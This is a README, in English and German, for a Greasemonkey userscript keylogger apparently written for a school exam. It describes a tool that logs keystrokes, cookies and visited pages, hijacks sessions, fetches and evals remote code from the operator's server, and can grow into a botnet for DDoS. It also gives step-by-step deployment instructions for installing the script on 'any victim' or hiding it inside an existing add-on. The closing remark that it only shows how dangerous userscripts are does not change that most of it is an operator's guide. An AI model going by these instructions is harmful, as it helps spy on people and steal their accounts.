# greasemonkey-keylogger

// ENGLISH
This is a full keylogger with a user interface, coded for a school project.
The keylogger is able to download more code from your webserver, you can create your own large bot-net.


First you have to change the domain, where the keylogger is located.
In file "eule.user.js" in line 16.
Then you copie the files on your webserver.
After that you have to create the database.
Now you can install the eule.user.js userscript on any victim or copy the code to an existing script/add-on.


// DEUTSCH

Für meine mündliche Abschlussprüfung in Computertechnik habe ich diesen Keylogger erstellt. 
Er beinhaltet ein umfangreiches Interface, wo man seine Opfer verwalten kann.
JavaScript Code wird vom Webserver runtergeladen um beim Opfer im Browser ausgeführt.

Es findet eine rund um die Uhr Überwachung der Cookies, der Texteingaben sowie besuchten Seiten statt.
Das ausspähen der Cookies und Sessions ermöglicht es, die Identität des Browsers ohne die Passwörter zu haben, anzunehmen.
Der Keylogger kann beliebig um weitere Methoden erweitert werden, muss dazu aber nicht beim Opfer angepasst werden.
Somit hat man auch die Möglichkeit DDos Angriffe auszuführen.

Das Script soll im großen und ganzen eigentlich nur zeigen, wie gefährlich Userscripts und Greasemonkey ist, 
da schadhafter Code im Hintergrund heruntergeladen und ausgeführt wird, ohne jemals von einem Anti-Viren Programm erfasst zu werden.

Die JavaScript-Funktion "eval" ist immer "evil"!
